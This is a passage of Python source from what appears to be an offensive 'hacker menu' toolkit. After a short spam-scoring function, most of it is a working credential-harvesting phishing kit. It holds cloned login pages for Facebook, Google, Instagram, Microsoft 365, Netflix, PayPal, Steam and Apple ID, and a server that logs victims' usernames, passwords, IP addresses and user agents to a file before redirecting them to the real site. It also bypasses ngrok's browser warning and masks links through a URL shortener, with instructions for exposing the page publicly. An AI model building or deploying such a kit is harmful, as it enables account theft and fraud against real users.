    print(f"\n{Colors.BLUE}[*] Analyzing text for spam characteristics...{Colors.RESET}")
    
    score = 0
    reasons = []
    text_len = len(text_to_analyze)
    if text_len == 0: text_len = 1

    # Heuristic 1: Excessive uppercase
    uppercase_ratio = sum(1 for c in text_to_analyze if c.isupper()) / text_len
    if uppercase_ratio > 0.3:
        score += 20
        reasons.append(f"High uppercase ratio ({uppercase_ratio:.1%})")

    # Heuristic 2: Spammy keywords
    spam_words = [
        'free', 'win', 'winner', 'won', 'cash', 'prize', 'claim', 'collect',
        'urgent', 'immediate', 'action required', 'limited time', 'offer',
        'guaranteed', 'risk-free', 'no cost', 'congratulations', 'selected',
        'click here', 'unsubscribe', 'viagra', 'pharmacy', 'loan', 'investment'
    ]
    word_tokens = re.findall(r'\b\w+\b', text_to_analyze.lower())
    found_spam_words = list(set([word for word in spam_words if word in word_tokens]))
    if found_spam_words:
        spam_word_count = len(found_spam_words)
        score += spam_word_count * 10
        reasons.append(f"Found {spam_word_count} spam-related keywords (e.g., {', '.join(found_spam_words[:3])})")

    # Heuristic 3: Excessive punctuation/special characters
    special_char_ratio = sum(1 for c in text_to_analyze if not c.isalnum() and not c.isspace()) / text_len
    if special_char_ratio > 0.15:
        score += 15
        reasons.append(f"High ratio of special characters ({special_char_ratio:.1%})")

    # Heuristic 4: Presence of currency symbols
    if any(c in text_to_analyze for c in '€$£¥'):
        score += 15
        reasons.append("Contains currency symbols")
        
    # Heuristic 5: Urgency and Exclusivity
    if re.search(r'\b(act now|once in a lifetime|don\'t delete|for instant access)\b', text_to_analyze, re.IGNORECASE):
        score += 20
        reasons.append("Uses phrases creating urgency or exclusivity")

    # Final Evaluation
    score = min(score, 100)
    
    print("\n" + "="*70)
    print(f"{Colors.BOLD}Analysis Report:{Colors.RESET}")
    print(f"  - {Colors.WHITE}Spam Likelihood Score: {Colors.BOLD}{score}/100{Colors.RESET}")
    
    if score > 75:
        verdict = f"{Colors.RED}{Colors.BOLD}Highly Likely Spam{Colors.RESET}"
    elif score > 50:
        verdict = f"{Colors.YELLOW}{Colors.BOLD}Potentially Spam{Colors.RESET}"
    else:
        verdict = f"{Colors.GREEN}Likely Not Spam{Colors.RESET}"
    
    print(f"  - {Colors.WHITE}Verdict: {verdict}{Colors.RESET}")

    if reasons:
        print(f"\n{Colors.BOLD}Contributing Factors:{Colors.RESET}")
        for reason in reasons:
            print(f"  - {Colors.WHITE}{reason}{Colors.RESET}")
    print("="*70)

# Credential Harvester Templates
PHISHING_TEMPLATES = {
    '1': {
        'name': 'Facebook (Meta) Login 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        :root { --fb-blue: #0866ff; --fb-bg: #f0f2f5; }
        body { font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--fb-bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .wrapper { display: flex; max-width: 980px; width: 100%; justify-content: space-between; align-items: center; padding: 20px; }
        .brand-section { width: 50%; padding-right: 32px; }
        .brand-section img { width: 300px; margin-left: -28px; }
        .brand-section h2 { font-size: 28px; font-weight: 400; line-height: 32px; color: #1c1e21; margin-top: -10px; }
        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 396px; text-align: center; }
        input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; transition: border-color 0.2s; }
        input:focus { border-color: var(--fb-blue); box-shadow: 0 0 0 2px #e7f3ff; }
        .btn-login { background: var(--fb-blue); color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: 700; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        .btn-login:hover { background: #075ce4; }
        .forgot { color: var(--fb-blue); font-size: 14px; text-decoration: none; display: block; margin: 16px 0; }
        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
        .btn-new { background: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: 700; padding: 12px 16px; cursor: pointer; transition: background 0.2s; }
        .btn-new:hover { background: #36a420; }
        .footer { margin-top: 28px; font-size: 14px; }
        @media (max-width: 900px) { .wrapper { flex-direction: column; text-align: center; } .brand-section { width: 100%; padding: 0; margin-bottom: 40px; } .brand-section img { margin-left: 0; } .brand-section h2 { font-size: 24px; } }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="brand-section">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/600px-Facebook_Logo_%282019%29.png" alt="Facebook">
            <h2>Connect with friends and the world around you on Facebook.</h2>
        </div>
        <div class="login-card">
            <form action="/" method="post">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit" class="btn-login">Log In</button>
            </form>
            <a href="#" class="forgot">Forgotten password?</a>
            <div class="divider"></div>
            <button class="btn-new">Create new account</button>
            <div class="footer"><b>Create a Page</b> for a celebrity, brand or business.</div>
        </div>
    </div>
</body>
</html>
"""
    },
    '2': {
        'name': 'Google (Workspace) Login 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; text-align: center; }
        .logo { width: 75px; margin-bottom: 16px; display: block; margin-left: auto; margin-right: auto; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 10px 0; }
        p { font-size: 16px; color: #202124; margin-bottom: 32px; }
        .input-group { position: relative; margin-bottom: 24px; text-align: left; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { border: 2px solid #0b57d0; outline: none; }
        .footer-btns { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
        .btn-text { color: #0b57d0; font-weight: 500; text-decoration: none; font-size: 14px; }
        .btn-next { background: #0b57d0; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="/" method="post">
            <div class="input-group">
                <input type="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="footer-btns">
                <a href="#" class="btn-text">Forgot email?</a>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
"""
    },
    '3': {
        'name': 'Instagram (Modern Dark) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .main-container { display: flex; align-items: center; gap: 32px; max-width: 800px; }
        .phone-img { height: 580px; display: block; }
        .right-column { display: flex; flex-direction: column; width: 350px; }
        .card { background: #000; border: 1px solid #262626; padding: 40px; text-align: center; margin-bottom: 10px; }
        .logo { margin-bottom: 30px; filter: invert(1); width: 175px; }
        input { width: 100%; background: #121212; border: 1px solid #262626; border-radius: 3px; color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; font-size: 12px; }
        .btn-login { background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; padding: 8px; width: 100%; cursor: pointer; margin-top: 10px; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #262626; margin: 0 10px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .fb-icon { width: 16px; }
        .forgot { font-size: 12px; color: #e0e0e0; margin-top: 20px; text-decoration: none; display: block; }
        .signup { border: 1px solid #262626; padding: 20px; text-align: center; font-size: 14px; }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .get-app { text-align: center; margin-top: 20px; font-size: 14px; }
        .app-stores { display: flex; justify-content: center; gap: 8px; margin-top: 10px; }
        .app-stores img { height: 40px; }
        @media (max-width: 800px) { .phone-img { display: none; } }
    </style>
</head>
<body>
    <div class="main-container">
        <img class="phone-img" src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd514016593.png" alt="Phone">
        <div class="right-column">
            <div class="card">
                <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                <form action="/" method="post">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="btn-login">Log In</button>
                </form>
                <div class="divider">OR</div>
                <div class="fb-login">
                    <img class="fb-icon" src="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/P3STTh26u9y.png" alt="FB">
                    Log in with Facebook
                </div>
                <a href="#" class="forgot">Forgot password?</a>
            </div>
            <div class="signup">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            <div class="get-app">
                Get the app.
                <div class="app-stores">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Y26_6BSc0ig.png" alt="App Store">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym_nP2.png" alt="Google Play">
                </div>
            </div>
        </div>
    </div>
</body>
</html>
"""
    },
    '4': {
        'name': 'Microsoft 365 / Outlook 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body { background: url('https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg') no-repeat center center fixed; background-size: cover; font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-box { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { width: 108px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px; }
        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 15px; margin-bottom: 20px; outline: none; }
        input:focus { border-bottom: 2px solid #0067b8; }
        .links { font-size: 13px; color: #0067b8; margin-bottom: 20px; }
        .btn-container { display: flex; justify-content: flex-end; }
        .btn-primary { background: #0067b8; color: #fff; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; transition: background 0.2s; }
        .btn-primary:hover { background: #005da6; }
        .options { margin-top: 28px; background: #fff; padding: 12px 44px; width: 440px; box-sizing: border-box; display: flex; align-items: center; gap: 12px; cursor: pointer; border: 1px solid #fff; transition: background 0.2s; }
        .options:hover { background: #f2f2f2; }
        .key-icon { width: 32px; }
    </style>
</head>
<body>
    <div style="display: flex; flex-direction: column; align-items: center;">
        <div class="login-box">
            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
            <h1>Sign in</h1>
            <form action="/" method="post">
                <input type="email" name="login" placeholder="Email, phone, or Skype" required>
                <div class="links">No account? <a href="#">Create one!</a></div>
                <div class="links"><a href="#">Can't access your account?</a></div>
                <div class="btn-container">
                    <button type="submit" class="btn-primary">Next</button>
                </div>
            </form>
        </div>
        <div class="options">
            <img class="key-icon" src="https://logincdn.msauth.net/shared/1.0/content/images/signin_options_4e48046ce74f4b89d45037c90576bfac.svg" alt="Key">
            <span>Sign-in options</span>
        </div>
    </div>
</body>
</html>
"""
    },
    '5': {
        'name': 'Netflix (Premium Red) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        body { background: #000; background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-07583f8b564/web/PH-en-20220502-popsignuptwoweeks-perspective_alpha_website_large.jpg'); background-size: cover; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; }
        .logo-container { width: 100%; padding: 20px 60px; box-sizing: border-box; }
        .logo { width: 167px; }
        .card { background: rgba(0,0,0,0.75); padding: 60px 68px; border-radius: 4px; width: 450px; box-sizing: border-box; margin-bottom: 100px; }
        h1 { color: #fff; font-size: 32px; font-weight: 700; margin-bottom: 28px; }
        input { width: 100%; background: #333; border: none; border-radius: 4px; color: #fff; padding: 16px 20px; margin-bottom: 16px; box-sizing: border-box; font-size: 16px; }
        .btn-signin { background: #e50914; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; padding: 16px; width: 100%; cursor: pointer; margin-top: 24px; }
        .btn-signin:hover { background: #f40612; }
        .help { display: flex; justify-content: space-between; color: #b3b3b3; font-size: 13px; margin-top: 10px; }
        .help a { color: #b3b3b3; text-decoration: none; }
        .signup-now { color: #737373; font-size: 16px; margin-top: 30px; }
        .signup-now a { color: #fff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="logo-container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
    </div>
    <div class="card">
        <h1>Sign In</h1>
        <form action="/" method="post">
            <input type="email" name="user" placeholder="Email or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit" class="btn-signin">Sign In</button>
        </form>
        <div class="help">
            <label><input type="checkbox" checked> Remember me</label>
            <a href="#">Need help?</a>
        </div>
        <div class="signup-now">
            New to Netflix? <a href="#">Sign up now</a>.
        </div>
    </div>
</body>
</html>
"""
    },
    '6': {
        'name': 'PayPal (Secure Connect) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <style>
        body { font-family: "PayPalSansBig-Regular", "Helvetica Neue", Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 460px; padding: 40px; text-align: center; }
        .logo { height: 32px; margin-bottom: 32px; }
        input { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #888; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .forgot { display: block; text-align: left; color: #0070ba; font-weight: 700; text-decoration: none; font-size: 14px; margin-bottom: 24px; }
        .btn-login { background: #003087; color: #fff; border: none; border-radius: 100px; padding: 16px; width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; }
        .divider { margin: 24px 0; border-top: 1px solid #cbd2d6; position: relative; }
        .divider span { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: #fff; padding: 0 10px; color: #6c7378; }
        .btn-signup { background: #e1e7eb; color: #003087; border: none; border-radius: 100px; padding: 16px; width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal">
        <form action="/" method="post">
            <input type="email" name="email" placeholder="Email or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <a href="#" class="forgot">Forgot password?</a>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <div class="divider"><span>or</span></div>
        <button class="btn-signup">Sign Up</button>
    </div>
</body>
</html>
"""
    },
    '7': {
        'name': 'Steam (Deck Style) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Login</title>
    <style>
        body { background: #1b2838 url('https://store.cloudflare.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask.jpg') no-repeat center top; background-size: cover; color: #fff; font-family: "Motiva Sans", Arial, Helvetica, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .login-card { background: rgba(24, 26, 33, 0.9); padding: 40px; border-radius: 4px; width: 400px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .logo { width: 176px; margin-bottom: 40px; display: block; margin-left: auto; margin-right: auto; }
        h1 { font-size: 28px; font-weight: 200; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 30px; text-align: center; }
        label { color: #1999ff; font-size: 12px; font-weight: bold; display: block; margin-bottom: 8px; text-transform: uppercase; }
        input { width: 100%; background: #32353c; border: 1px solid #000; border-radius: 2px; color: #fff; padding: 12px; margin-bottom: 24px; box-sizing: border-box; outline: none; }
        input:focus { border: 1px solid #1999ff; }
        .btn-signin { background: linear-gradient(to right, #06bfff, #2d73ff); color: #fff; border: none; border-radius: 2px; padding: 12px; width: 100%; font-size: 16px; font-weight: 600; cursor: pointer; transition: filter 0.2s; }
        .btn-signin:hover { filter: brightness(1.2); }
        .help { margin-top: 40px; font-size: 12px; text-align: center; }
        .help a { color: #afafaf; text-decoration: none; }
        .help a:hover { color: #fff; }
        .qr-section { margin-top: 30px; border-top: 1px solid #333; padding-top: 30px; text-align: center; }
        .qr-img { width: 150px; background: #fff; padding: 10px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="login-card">
        <img class="logo" src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam">
        <h1>Sign In</h1>
        <form action="/" method="post">
            <label>Steam Account Name</label>
            <input type="text" name="user" required>
            <label>Password</label>
            <input type="password" name="pass" required>
            <button type="submit" class="btn-signin">Sign In</button>
        </form>
        <div class="qr-section">
            <p style="font-size: 12px; color: #1999ff; font-weight: bold; margin-bottom: 15px;">OR SIGN IN WITH QR CODE</p>
            <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=SteamLoginPhish" alt="QR Code">
            <p style="font-size: 11px; color: #888; margin-top: 10px;">Use the Steam Mobile App to sign in via QR code</p>
        </div>
        <div class="help">
            <a href="#">Help, I can't sign in</a>
        </div>
    </div>
</body>
</html>
"""
    },
    '8': {
        'name': 'Apple ID (Glassmorphism) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Apple ID</title>
    <style>
        body { background: url('https://www.apple.com/v/apple-id/a/images/overview/hero_banner__dqskq86f4u6u_large.jpg') center/cover; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .glass-card { background: rgba(255,255,255,0.8); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-radius: 18px; padding: 60px; width: 460px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .apple-logo { font-size: 40px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
        input { width: 100%; padding: 14px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 17px; margin-bottom: 12px; box-sizing: border-box; }
        .btn-continue { background: #000; color: #fff; border: none; border-radius: 12px; width: 44px; height: 44px; font-size: 20px; cursor: pointer; position: absolute; right: 70px; margin-top: -55px; }
        .footer-links { font-size: 14px; color: #0066cc; margin-top: 40px; }
        .footer-links a { text-decoration: none; color: inherit; }
    </style>
</head>
<body>
    <div class="glass-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="width: 40px; margin-bottom: 20px;" alt="Apple">
        <h1>Sign in with Apple ID</h1>
        <form action="/" method="post">
            <input type="text" name="appleid" placeholder="Apple ID" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn-continue">→</button>
        </form>
        <div class="footer-links">
            <a href="#">Forgot Apple ID or password?</a>
        </div>
    </div>
</body>
</html>
"""
    },
    '9': {
        'name': 'Custom HTML File',
        'html': '' # This will be loaded from a file
    },
    '10': {
        'name': 'Generic SaaS Portal 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Portal</title>
    <style>
        body { font-family: 'Inter', sans-serif; background: #f9fafb; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: #fff; border: 1px solid #e5e7eb; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 40px; width: 400px; }
        .header { text-align: center; margin-bottom: 32px; }
        .header h2 { font-size: 24px; font-weight: 700; color: #111827; margin: 0; }
        .header p { color: #6b7280; margin-top: 8px; }
        label { display: block; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 8px; }
        input { width: 100%; padding: 10px 12px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; margin-bottom: 20px; box-sizing: border-box; }
        input:focus { border-color: #4f46e5; ring: 2px #c7d2fe; outline: none; }
        .btn-submit { width: 100%; background: #4f46e5; color: #fff; border: none; border-radius: 6px; padding: 10px; font-size: 14px; font-weight: 600; cursor: pointer; }
        .btn-submit:hover { background: #4338ca; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://cdn-icons-png.flaticon.com/512/281/281764.png" style="width: 48px; margin-bottom: 16px;" alt="Portal">
            <h2>Welcome back</h2>
            <p>Please enter your details</p>
        </div>
        <form action="/" method="post">
            <label>Email address</label>
            <input type="email" name="email" placeholder="you@company.com" required>
            <label>Password</label>
            <input type="password" name="pass" required>
            <button type="submit" class="btn-submit">Sign in</button>
        </form>
    </div>
</body>
</html>
"""
    }
}


# Helper class for threaded server
class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    pass

def generate_masked_link(original_url, fake_domain):
    """Generates a professional-looking shortened link for social engineering."""
    if not original_url.startswith(('http://', 'https://')):
        return None, None
        
    try:
        import requests
        # We use is.gd because it allows custom suffixes occasionally, 
        # but for reliability we'll just get a standard short URL.
        api_url = f"https://is.gd/create.php?format=simple&url={original_url}"
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            short_url = response.text
            # The '@' trick is dead in 2025 (browsers block it).
            # Instead, we provide a clean, shortened URL.
            return short_url, f"{short_url}/{fake_domain}-access"
    except Exception:
        pass
    
    return original_url, None

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    pass

def credential_harvester_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}CREDENTIAL HARVESTER {Colors.BORDER}]══╗{Colors.RESET}\n")

    print(f"{Colors.PURPLE}Available Phishing Templates:{Colors.RESET}")
    # Sort templates by key for consistent display
    sorted_templates = sorted(PHISHING_TEMPLATES.items(), key=lambda item: int(item[0]))
    for key, val in sorted_templates:
        print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {val['name']}{Colors.RESET}")
    
    template_choice = input(f"{Colors.BLUE}[+] Choose a template number: {Colors.RESET}")
    if template_choice not in PHISHING_TEMPLATES:
        print(f"\n{Colors.RED}[!] Invalid template choice.{Colors.RESET}")
        return

    selected_template_name = PHISHING_TEMPLATES[template_choice]['name']
    selected_template_html = ""

    # Determine default redirect URL based on template name
    default_redirect = "https://www.google.com"
    if "Facebook" in selected_template_name: default_redirect = "https://www.facebook.com"
    elif "Google" in selected_template_name: default_redirect = "https://accounts.google.com"
    elif "Instagram" in selected_template_name: default_redirect = "https://www.instagram.com"
    elif "Microsoft" in selected_template_name or "Outlook" in selected_template_name: default_redirect = "https://login.live.com"
    elif "Netflix" in selected_template_name: default_redirect = "https://www.netflix.com"
    elif "PayPal" in selected_template_name: default_redirect = "https://www.paypal.com"
    elif "Steam" in selected_template_name: default_redirect = "https://store.steampowered.com/login/"

    if selected_template_name == 'Custom HTML File':
        html_file_path = input(f"{Colors.BLUE}[+] Enter path to your custom HTML file: {Colors.RESET}")
        if not os.path.exists(html_file_path):
            print(f"\n{Colors.RED}[!] Custom HTML file not found at: {html_file_path}{Colors.RESET}")
            return
        try:
            with open(html_file_path, 'r', encoding='utf-8') as f:
                selected_template_html = f.read()
            selected_template_name = f"Custom: {os.path.basename(html_file_path)}"
        except Exception as e:
            print(f"\n{Colors.RED}[!] Error reading custom HTML file: {e}{Colors.RESET}")
            return
    else:
        selected_template_html = PHISHING_TEMPLATES[template_choice]['html']

    redirect_url = input(f"{Colors.BLUE}[+] Enter URL to redirect victims after submission (Default: {default_redirect}): {Colors.RESET}")
    if not redirect_url:
        redirect_url = default_redirect
    
    if not (redirect_url.startswith('http://') or redirect_url.startswith('https://')):
        print(f"\n{Colors.RED}[!] Invalid URL format. Please include http:// or https://.{Colors.RESET}")
        return


    host = get_validated_input("Listening Host", default="0.0.0.0")
    port = get_validated_input("Listening Port", int, default=8080, valid_range=range(1, 65536))

    my_server = None
    server_thread = None
    try:
        # Update the handler to use the chosen template and redirect URL
        class CustomHarvesterHandler(CredentialHarvesterHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                
                # Comprehensive Tunnel Bypass Headers (Ngrok, LocalXpose, etc.)
                self.send_header("ngrok-skip-browser-warning", "any-value")
                self.send_header("X-Ngrok-Skip-Browser-Warning", "true")
                self.send_header("Bypass-Tunnel-Reminder", "true")
                
                self.end_headers()
                self.wfile.write(selected_template_html.encode())

            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                # Detect Real IP if using Ngrok (X-Forwarded-For)
                victim_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
                
                print(f"\n{Colors.RED}{Colors.BOLD}[!!!] CREDENTIALS HARVESTED [!!!]{Colors.RESET}")
                print(f"{Colors.PURPLE}  >> Victim IP: {victim_ip} (Template: {selected_template_name}){Colors.RESET}")
                print(f"{Colors.PURPLE}  >> User-Agent: {self.headers.get('User-Agent')}{Colors.RESET}")
                print(f"{Colors.PURPLE}  >> Data: {post_data}{Colors.RESET}")
                
                # Save to file
                with open("captured_creds.txt", "a") as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] IP: {victim_ip} | Template: {selected_template_name} | Data: {post_data}\n")
                
                try:
                    parsed_data = {}
                    for item in post_data.split('&'):
                        if '=' in item:
                            key, value = item.split('=', 1)
                            parsed_data[key] = value
                    if parsed_data:
                        print(f"{Colors.CYAN}  >> Parsed:{Colors.RESET}")
                        for k, v in parsed_data.items():
                            print(f"{Colors.CYAN}     {k}: {v}{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}  >> Error parsing POST data: {e}{Colors.RESET}")

                self.send_response(302) # Redirect
                self.send_header('Location', redirect_url)
                
                # Keep bypass active for the redirect response
                self.send_header("ngrok-skip-browser-warning", "any-value")
                self.send_header("X-Ngrok-Skip-Browser-Warning", "true")
                self.send_header("Bypass-Tunnel-Reminder", "true")
                
                self.end_headers()

        ThreadedHTTPServer.allow_reuse_address = True
        my_server = ThreadedHTTPServer((host, port), CustomHarvesterHandler)
        
        print(f"\n{Colors.BLUE}[*] Starting credential harvester on {host}:{port} with '{selected_template_name}'...{Colors.RESET}")
        print(f"{Colors.BLUE}[*] Serving fake page. Waiting for submissions...{Colors.RESET}")
        print(f"{Colors.BLUE}  - Access at: http://{host}:{port}{Colors.RESET}")
        print(f"{Colors.BLUE}  - Victims will be redirected to: {redirect_url}{Colors.RESET}")

        # Social Engineering Link Masker
        print(f"\n{Colors.BLUE}[?] Generate a masked 'Social Engineering' link? (y/n){Colors.RESET}")
        if input(get_prompt()).lower() == 'y':
            print(f"\n{Colors.WHITE}    To make this work publicly, you MUST use a tool like Ngrok.")
            print(f"    1. Run: 'ngrok http {port}' in another terminal.")
            print(f"    2. Copy the 'Forwarding' URL (e.g., https://a1b2-c3d4.ngrok-free.app).")
            print(f"    3. Paste that EXACT URL below.{Colors.RESET}")
            
            public_url = input(f"\n{Colors.BLUE}[+] Paste your PUBLIC NGROK URL (e.g., https://1234.ngrok-free.app): {Colors.RESET}").strip()
            
            if not public_url:
                print(f"{Colors.RED}[!] Error: You must provide a URL to generate a link.{Colors.RESET}")
                return

            if "127.0.0.1" in public_url or "localhost" in public_url:
                print(f"\n{Colors.RED}{Colors.BOLD}[!] STOP!{Colors.RESET}")
                print(f"{Colors.YELLOW}    You pasted a LOCAL address ({public_url}).")
                print(f"    Local addresses only work on YOUR computer.")
                print(f"    To go public, you MUST use the link from Ngrok (Terminal 2).{Colors.RESET}")
                return
            
            if not public_url.startswith(('http://', 'https://')):
                print(f"{Colors.RED}[!] Error: The URL must start with http:// or https://{Colors.RESET}")
            else:
                # Determine fake domain for the "slug"
                fake_domain = "login"
